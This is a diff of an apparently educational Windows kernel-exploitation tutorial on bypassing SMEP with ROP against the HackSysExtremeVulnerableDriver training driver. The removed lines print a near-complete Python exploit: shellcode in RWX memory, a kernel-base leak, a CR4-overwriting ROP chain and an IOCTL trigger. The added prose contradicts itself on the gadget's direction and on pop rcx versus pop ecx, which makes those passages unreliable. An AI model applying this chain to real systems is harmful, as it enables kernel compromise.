@@ -273,123 +273,36 @@ User mode payload address
 -------------------
 ```
 
-Let's go hunting for these ROP gadgets. Remember, these ROP gadgets need to be kernel mode addresses. There is a function located in `ntosknrl.exe` known as `KiEnableXSave()`. I noticed, when doing kernel debugging, the value of the `cr4` register changes during startup. There is a function that helps with this value, which is `KiEnableXSave()`. Let's look at this function at an offset of 0x6a08 from `nt!KiEnableXSave()`(this offset will be different on your machine. Also note, I was only able to view this function during the boot up process with WinDbg- don't ask me why. However, the code will be available when it comes time to use it).
+Let's go hunting for these ROP gadgets. Remember, these ROP gadgets need to be kernel mode addresses. We will use [rp++](https://github.com/0vercl0k/rp) to enumerate rop gadgets in `ntoskrnl.exe`. If you take a look at [my post](https://connormcgarr.github.io/ROP/) about ROP, you will see how to use this tool.
 
-<img src="{{ site.url }}{{ site.baseurl }}/images/64_20.png" alt="">
+Let's figure out a way to control the contents of the CR4 register. Although we won't probably won't be able to directly manipulate the contents of the register directly, perhaps we can move the contents of a register that we can control into the CR4 register. Recall that a `pop <reg>` operation will take the contents of the next item on the stack, and store it in the register following the `pop` operation. Let's keep this in mind.
 
-So now we found a way to move the value within RCX into the CR4 register! The ROP gadget above is located at an offset of the kernel base + 0x4265221. This is good, we can theoretically control the CR4 regsiter, if we can control the value in RCX. Controlling the RCX register should not be too difficult, with a `pop rcx; ret` ROP gadget. Since we are not executing any of the values being stored in the registers (we just want to place a value in the CR4 register), we can supply our own value to be "popped" into the RCX register. Recall, a `pop <reg>` instruction will take the next item on the stack (pointed to by RSP) and place it into the register specified by `pop`.
+Using rp++, we have found a nice ROP gadget in `ntoskrnl.exe`, that allows us to store the contents of CR4 in the `ecx` register (the "second" 32-bits of the CR4 register.)
 
-So, first order of business is to get our intended CR4 value stored in RCX. A nice ROP gadget that performs a `pop ecx, ret` is located in the function `HvlEndSystemInterrput`. This ROP gadget is located at an offset of the kernel base + 0x1684f0.
+<img src="{{ site.url }}{{ site.baseurl }}/images/64_20_a.png" alt="">
 
-<img src="{{ site.url }}{{ site.baseurl }}/images/64_21.png" alt="">
+As you can see, this ROP gadget is "located" at 0x140108552. However, since this is a kernel mode address- rp++ (from usermode and not ran as an administrator) will not give us the full address of this. However, if you remove the first 3 bytes, the rest of the "address" is really an offset from the kernel base. This means this ROP gadget is located at ntoskrnl.exe + 0x108552.
 
-We have our two ROP gadgets let's get this updated inside of an exploit script with breakpoints on our shellcode.
+<img src="{{ site.url }}{{ site.baseurl }}/images/64_21_a.png" alt="">
 
-```python
-import struct
-import sys
-import os
-from ctypes import *
+Awesome! So now we have a way to move the contents of the ECX register into the CR4 register. How can we control the contents of the ECX register that allow us to get our desired result? Recall the property of ROP from my previous post. Whenever we had a nice ROP gadget that allowed a desired intruction, but there was an unecessary `pop` in the gadget, we used filler data of NOPs. This is because we are just simply placing data in a register- we are not executing it.
 
-kernel32 = windll.kernel32
-ntdll = windll.ntdll
-psapi = windll.Psapi
+The same principle applies here. If we can `pop` our intended flag value into ECX, we should have no problem. Here is the issue though. In `ntoskrnl.exe`, there is no direct `pop ecx, ret` ROP gadget. Instead, we will POP our value into RCX. RCX will contain a value of 0x506f8 (our intended CR4 register value). RCX has the ability to hold a piece of data that is 8 bytes long (0xffffffffffffffff). So, if we executed a `pop rcx` with our intended CR4 register value, RCX would contain 0x00000000000506f8.
 
+You may be asking "Okay we can control RCX- but our ROP gadget moves ECX into CR4- not RCX."
 
-payload = bytearray(
-    "\xCC" * 50
-)
+Great point. Recall, however, how the registers work here.
 
-# Defeating DEP with VirtualAlloc. Creating RWX memory, and copying our shellcode in that region.
-# We also need to bypass SMEP before calling this shellcode
-print "[+] Allocating RWX region for shellcode"
-ptr = kernel32.VirtualAlloc(
-    c_int(0),                         # lpAddress
-    c_int(len(payload)),              # dwSize
-    c_int(0x3000),                    # flAllocationType
-    c_int(0x40)                       # flProtect
-)
-
-# Creates a ctype variant of the payload (from_buffer)
-c_type_buffer = (c_char * len(payload)).from_buffer(payload)
-
-print "[+] Copying shellcode to newly allocated RWX region"
-kernel32.RtlMoveMemory(
-    c_int(ptr),                       # Destination (pointer)
-    c_type_buffer,                    # Source (pointer)
-    c_int(len(payload))               # Length
-)
-
-# Need kernel leak to bypass KASLR
-# Using Windows API to enumerate base addresses
-# We need kernel mode ROP gadgets
-
-# c_ulonglong because of x64 size (unsigned __int64)
-base = (c_ulonglong * 1024)()
-
-print "[+] Calling EnumDeviceDrivers()..."
-
-get_drivers = psapi.EnumDeviceDrivers(
-    byref(base),                      # lpImageBase (array that receives list of addresses)
-    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
-    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
-)
-
-# Error handling if function fails
-if not base:
-    print "[+] EnumDeviceDrivers() function call failed!"
-    sys.exit(-1)
-
-# The first entry in the array with device drivers is ntoskrnl base address
-kernel_address = base[0]
-
-print "[+] Found kernel leak!"
-print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))
-
-# Offset to control execution
-input_buffer = ("\x41" * 2048 + "\x42" * 8)
-
-# SMEP says goodbye
-print "[+] Starting ROP chain. Goodbye SMEP..."
-input_buffer += struct.pack('<Q', kernel_address + 0x1684f0)    # pop ecx; ret ; nt!HvlEndSystemInterrupt+0x1e
-
-print "[+] Flipped SMEP bit to 0 in RCX..."
-input_buffer += struct.pack('<Q', 0x00000000000506f8)            # Intended CR4 value
-
-print "[+] Placed disabled SMEP value in CR4..."
-input_buffer += struct.pack('<Q', kernel_address + 0x411505)    # mov cr4, rcx ; ret ; nt!KiEnableXSave+0x6a08
-
-print "[+] SMEP disabled!"
-input_buffer += struct.pack('<Q', ptr)                           # Location of user mode shellcode
-
-# Crash the application
-input_buffer += "\x90" * (4000 - len(input_buffer))
-
-input_buffer_length = len(input_buffer)
-
-# 0x222003 = IOCTL code that will jump to TriggerStackOverflow() function
-# Getting handle to driver to return to DeviceIoControl() function
-print "[+] Using CreateFileA() to obtain and return handle referencing the driver..."
-handle = kernel32.CreateFileA(
-    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
-    0xC0000000,                         # dwDesiredAccess
-    0,                                  # dwShareMode
-    None,                               # lpSecurityAttributes
-    0x3,                                # dwCreationDisposition
-    0,                                  # dwFlagsAndAttributes
-    None                                # hTemplateFile
-)
-
-# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
-print "[+] Interacting with the driver..."
-kernel32.DeviceIoControl(
-    handle,                             # hDevice
-    0x222003,                           # dwIoControlCode
-    input_buffer,                       # lpInBuffer
-    input_buffer_length,                # nInBufferSize
-    None,                               # lpOutBuffer
-    0,                                  # nOutBufferSize
-    byref(c_ulong()),                   # lpBytesReturned
-    None                                # lpOverlapped
-)
 ```
+-----------------------------------
+               RCX
+-----------------------------------
+                       ECX
+-----------------------------------
+                             CX
+-----------------------------------
+                           CH    CL
+-----------------------------------
+```
+
+This means, even though RCX contains 0x00000000000506f8, a `mov cr4, ecx` would take the lower 32-bits of RCX (which is ECX) and place it into the CR4 register. This would mean ECX would equal 0x000506f8- and that value would end up in CR4. So even though we are using both RCX and ECX, due to lack of `pop rcx` ROP gadgets, we will be unaffected!
